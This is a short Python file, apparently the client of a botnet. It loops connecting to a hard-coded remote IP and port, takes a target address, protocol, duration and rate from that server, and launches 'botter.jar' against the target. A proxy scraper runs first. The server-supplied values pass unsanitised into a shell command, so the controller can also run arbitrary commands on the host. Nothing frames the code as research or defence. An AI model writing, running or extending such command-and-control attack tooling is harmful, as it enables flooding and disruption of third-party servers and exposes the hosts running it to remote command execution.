# client

# this is the code before the impl of qchecker

import socket
import subprocess

import proxy_scraper

client_name = input("Enter client name: ")
server_host = '84.54.51.45'
server_port = 35565


def connect_to_server(server_host, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = client_socket.connect_ex((server_host, server_port))

    if result:
        return
    print(f"Connected to the server at {server_host}:{server_port}")
    client_socket.send(client_name.encode('utf-8'))

    target_ip, protocol, seconds, cps = client_socket.recv(1024).decode('utf-8').split("??<><>")
    command = f"java -jar botter.jar {target_ip} {protocol} {seconds} {cps}"
    print(command)
    subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    client_socket.send("!!".encode('utf-8'))


def main():
    proxy_scraper.main()
    while True:
        connect_to_server(server_host, server_port)


main()